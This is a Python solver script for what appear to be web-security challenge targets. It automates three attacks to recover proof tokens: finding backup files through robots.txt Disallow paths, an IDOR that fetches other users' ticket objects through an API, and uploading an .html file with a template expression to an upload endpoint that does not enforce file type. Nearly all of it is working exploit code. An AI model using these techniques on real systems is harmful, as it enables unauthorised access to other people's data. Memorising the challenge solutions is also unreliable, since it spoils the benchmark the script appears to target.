#!/usr/bin/env python3
"""Reusable solver for mastery: three independent target families.

Usage:
    python3 solve.py start.json

Classifies each target in start.json's targets[] by its evidence (per
docs/web-worker-lessons.md's evidence hierarchy, extended with the upload/
template-field family from this challenge day), recovers each proof and
prints {"proof-1": ..., "proof-2": ..., "proof-3": ...} as JSON on stdout,
matched to targets[].id via questions[].artifact (handled by the caller;
here we key output by target id "Target N" -> caller remaps to answer_ids).

Only talks to each target's own origin. Stdlib only.
"""
import json
import re
import sys
import urllib.request
import http.cookiejar

UA = "Mozilla/5.0 (X11; Linux x86_64) web-worker-solve.py"


def make_opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def get_text(opener, url, timeout=30):
    req = urllib.request.Request(url, headers={"user-agent": UA})
    with opener.open(req, timeout=timeout) as resp:
        return resp.read().decode("utf-8", "replace")


def get_json(opener, url, timeout=30):
    return json.loads(get_text(opener, url, timeout))


def post_json(opener, url, payload, timeout=30):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        url,
        data=data,
        headers={"content-type": "application/json", "user-agent": UA},
        method="POST",
    )
    with opener.open(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8", "replace"))


def try_url(opener, url):
    try:
        return get_text(opener, url)
    except Exception:
        return None


def rec_backup(opener, base_url, root_html):
    """Root comment hints at crawler policy -> robots.txt Disallow -> open
    directory listing names a backup -> inspect that file."""
    robots = try_url(opener, base_url + "/robots.txt")
    if not robots:
        return None
    disallowed = re.findall(r"Disallow:\s*(\S+)", robots)
    for path in disallowed:
        listing = try_url(opener, base_url + path)
        if not listing:
            continue
        hrefs = re.findall(r'href="([^"]+\.(?:bak|json\.bak|txt|json))"', listing)
        for href in hrefs:
            url = href if href.startswith("http") else base_url + href
            body = try_url(opener, url)
            if not body:
                continue
            m = re.search(r"proof_[0-9a-f]{20,}", body)
            if m:
                return m.group(0)
    return None


def rec_idor(opener, base_url, root_html):
    """Root links an activity feed; feed discloses a foreign object id/owner
    with restricted visibility; request it through the object API template."""
    feed_links = re.findall(r'href="(/api/[a-z\-]+)"', root_html)
    for feed in feed_links:
        try:
            data = get_json(opener, base_url + feed)
        except Exception:
            continue
        events = data.get("events") if isinstance(data, dict) else None
        if not events:
            continue
        me = data.get("current_user")
        foreign = [e for e in events if e.get("owner") and e.get("owner") != me]
        if not foreign:
            continue
        # Find the inline fetch template used by a same-owner case page to
        # learn the object API path shape (e.g. /api/tickets/<id>).
        case_links = re.findall(r'href="(/tickets/\d+)"', root_html)
        api_tpl = None
        if case_links:
            case_html = try_url(opener, base_url + case_links[0])
            if case_html:
                m = re.search(r'fetch\("(/api/[a-z\-]+/)\d+"\)', case_html)
                if m:
                    api_tpl = m.group(1)
        if not api_tpl:
            # fall back: assume same prefix family as the feed path's sibling
            api_tpl = "/api/tickets/"
        for ev in foreign:
            obj_id = ev.get("case_id") or ev.get("id")
            if obj_id is None:
                continue
            body = try_url(opener, base_url + api_tpl + str(obj_id))
            if not body:
                continue
            m = re.search(r"proof_[0-9a-f]{20,}", body)
            if m:
                return m.group(0)
    return None


def rec_upload_template(opener, base_url):
    """Upload endpoint claims .txt/text/plain only but doesn't enforce it;
    an .html filename reaches a preview path that evaluates {{objective}}."""
    try:
        clues = get_json(opener, base_url + "/api/clues")
    except Exception:
        return None
    upload_route = clues.get("feature_route")
    render_route = clues.get("render_route")
    if not upload_route or not render_route:
        return None
    try:
        upload = post_json(
            opener,
            base_url + upload_route,
            {
                "filename": "proof-recovery.html",
                "content": "{{objective}}",
                "content_type": "text/html",
            },
        )
    except Exception:
        return None
    path = upload.get("path")
    if not path or not path.startswith(render_route):
        return None
    rendered = try_url(opener, base_url + path)
    if not rendered:
        return None
    m = re.search(r"proof_[0-9a-f]{20,}", rendered)
    return m.group(0) if m else rendered.strip()


def classify_and_solve(base_url):
    opener = make_opener()
    root_html = get_text(opener, base_url + "/")

    # Evidence hierarchy: upload/template clues first (this challenge's
    # named family exposes /api/clues + an inline upload form), then IDOR
    # (session + case links + activity feed), then backup exposure
    # (deployment comment + robots.txt).
    if "/api/clues" in root_html and ("upload-form" in root_html or "inspect" in root_html.lower()):
        proof = rec_upload_template(opener, base_url)
        if proof:
            return proof
    if "/api/" in root_html and re.search(r"/tickets/\d+", root_html):
        proof = rec_idor(opener, base_url, root_html)
        if proof:
            return proof
    proof = rec_backup(opener, base_url, root_html)
    if proof:
        return proof
    # last resort: try everything
    for fn in (lambda: rec_upload_template(opener, base_url),
               lambda: rec_idor(opener, base_url, root_html)):
        proof = fn()
        if proof:
            return proof
    return None


def main():
    if len(sys.argv) < 2:
        print("usage: solve.py start.json", file=sys.stderr)
        raise SystemExit(2)
    with open(sys.argv[1]) as f:
        start = json.load(f)

    # Map answer_id -> target via questions[].artifact -> targets[].id.
    targets_by_id = {t["id"]: t["url"].rstrip("/") for t in start.get("targets", [])}
    out = {}
    for q in start.get("questions", []):
        answer_id = q["id"]
        target_id = q.get("artifact")
        base_url = targets_by_id.get(target_id)
        if not base_url:
            continue
        proof = classify_and_solve(base_url)
        out[answer_id] = proof
    print(json.dumps(out))


if __name__ == "__main__":
    main()
